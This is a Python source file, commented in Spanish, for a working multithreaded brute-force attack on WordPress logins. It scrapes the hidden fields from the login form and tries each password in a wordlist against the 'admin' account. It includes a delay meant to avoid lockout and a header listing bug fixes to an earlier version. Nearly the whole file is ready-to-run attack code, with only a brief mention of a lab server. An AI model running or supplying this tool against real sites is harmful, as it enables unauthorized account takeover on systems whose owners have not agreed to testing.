"""
WP_killer.py - Brute-force de login WordPress
==============================================
Obtiene el formulario de login de WordPress, extrae los campos ocultos
(nonce, testcookie…) y lanza un ataque de fuerza bruta multihilo
probando cada contraseña de la wordlist.

ERRORES CORREGIDOS:
    1. `etree.parser(BytesIO(content), parser=parser)` → función inexistente.
       Corregido a `etree.parse(BytesIO(content), parser=parser)`.
    2. `print("Password is %s\n" % brute)` → variable `brute` no definida.
       Corregido a `passwd` (variable correcta del bucle).
    3. `b = Bruter('ch4rl13', url)` → `url` no definida en ese scope.
       Corregido a `TARGET`.
    4. Ruta personal del wordlist reemplazada por variable de entorno.
    5. URLs personales reemplazadas por ejemplo genérico.

REQUISITOS:
    pip install requests lxml

EJEMPLOS DE EJECUCIÓN:
    # Apuntar al servidor de lab:
    TARGET="http://tu-servidor-lab/wp-login.php" WORDLIST="/ruta/cain.txt" python WP_killer.py
"""

import os
import sys
import threading
import time
from io import BytesIO
from queue import Queue

import requests
from lxml import etree

# -------------------------------------------------------------------
# Configuración — ajustar para tu entorno de lab
# -------------------------------------------------------------------
SUCCESS  = 'Welcome to WordPress!'
TARGET   = os.environ.get('TARGET',   'http://target-example.com/wordpress/wp-login.php')  # FIX: URL personal eliminada
WORDLIST = os.environ.get('WORDLIST', 'wordlist.txt')  # FIX: ruta personal eliminada


def get_words():
    """
    Lee la wordlist y la encola.

    Returns:
        Queue: Cola con todas las palabras del fichero.
    """
    with open(WORDLIST) as f:
        raw_words = f.read()
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words


def get_params(content):
    """
    Parsea el HTML del formulario de login y devuelve un dict con los campos
    (name → value). Los campos ocultos (nonce, testcookie…) se incluyen
    automáticamente para que la petición POST sea válida.

    Args:
        content (bytes): Cuerpo HTML de la página de login.

    Returns:
        dict: Campos del formulario.
    """
    params = {}
    parser = etree.HTMLParser()
    # FIX: `etree.parser(...)` → `etree.parse(...)` (nombre correcto)
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('.//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params


class Bruter:
    """Gestiona el ataque de fuerza bruta contra el formulario de login WP."""

    def __init__(self, username, url):
        self.username = username
        self.url      = url
        self.found    = False
        print(f'\nAtaque de fuerza bruta iniciado en {url}.\n')
        print(f'Usuario objetivo: {username}\n')

    def run_bruteforce(self, passwords):
        """Lanza 10 hilos, cada uno llamando a web_bruter."""
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        """
        Hilo que prueba contraseñas hasta vaciar la cola o encontrar la correcta.

        Args:
            passwords (Queue): Cola de contraseñas a probar.
        """
        session = requests.Session()
        resp0   = session.get(self.url)
        params  = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)  # Pausa para evitar bloqueos por intentos fallidos
            passwd = passwords.get()
            print(f'Probando {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f'\nFuerza bruta exitosa.')
                print(f'Usuario:    {self.username}')
                print(f'Contraseña: {passwd}\n')  # FIX: `brute` → `passwd`
                print('Limpiando el resto de hilos...')


if __name__ == '__main__':
    words = get_words()
    # FIX: `url` no definida → se usa la constante TARGET
    b = Bruter('admin', TARGET)
    b.run_bruteforce(words)
